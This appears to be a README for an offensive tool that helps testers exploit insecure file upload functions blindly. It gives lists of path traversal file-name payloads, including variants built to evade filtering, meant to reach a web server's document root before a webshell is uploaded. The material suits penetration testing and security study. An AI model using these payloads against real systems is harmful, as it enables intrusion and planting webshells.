Blindly exploiting insecure file upload implementations

The general assumptions are as follows:
- we have a file upload function in the application and we have some sample, valid file that is accepted (e.g. a JPEG image)
- our goal is to upload an executable (a webshell), but we do not know what the remote document root is, we also do not know what are the file upload restrictions in place

First of all, we will attempt to find a way to reach the document root. After we achieve that, we can focus on uploading malicious files instead of legitimate ones. It is better to start with a legitimate file in order to decrease the likehood of failure due to forbidden content/extension and focus on reaching the document root first. And this phase is the only purpose of this tool.

Reaching the document root

There are two scenarios we may face when blindly attacking the upload dir:

a) the upload dir is located in the document root, in such case we should do fine without knowing its path at all, as it should be sufficient to attack with path traversal payloads reflecting several layers of nesting in order to hit the document root itself. It might be reasonable to employ a basic evasive technique at this point already (for non-recursive removals of '../' and './':

./../test.jpg
./../../test.jpg
./../../../test.jpg
./../../../../test.jpg
./../../../../../test.jpg
./../../../../../../test.jpg
./../../../../../../../test.jpg
./../../../../../../../../test.jpg


./....//test.jpg
./....//....//test.jpg
./....//....//....//test.jpg
./....//....//....//....//test.jpg
./....//....//....//....//....//test.jpg
./....//....//....//....//....//....//test.jpg
./....//....//....//....//....//....//....//test.jpg
./....//....//....//....//....//....//....//....//test.jpg


..//...//test.jpg
..//...//...//test.jpg
..//...//...//...//test.jpg
..//...//...//...//...//test.jpg
..//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//...//test.jpg
..//...//...//...//...//...//...//...//...//test.jpg


b) the upload directory is located outside the document root, that is why we need to employ both directory traversal and full document root path guessing. 


So, we try both scenarios in one go. 
After the series of file upload attempts, we check the document root for existance of the file we tried to create:
http://example.org/test.jpg

The default configuration of get_docroots.pl provides us with a full list of possible payloads covering both above scenarios.
Its list of known document root paths is generated the same way as with --os-shell feature in sqlmap. 
Please see the sample_results.txt file to see the results procuded with default configuration.

If the file is there, we have reached the document root and now we can use the relevant traversal payload in order to try to bypass any file upload restrictions (extension, content, mime type, size, etc).
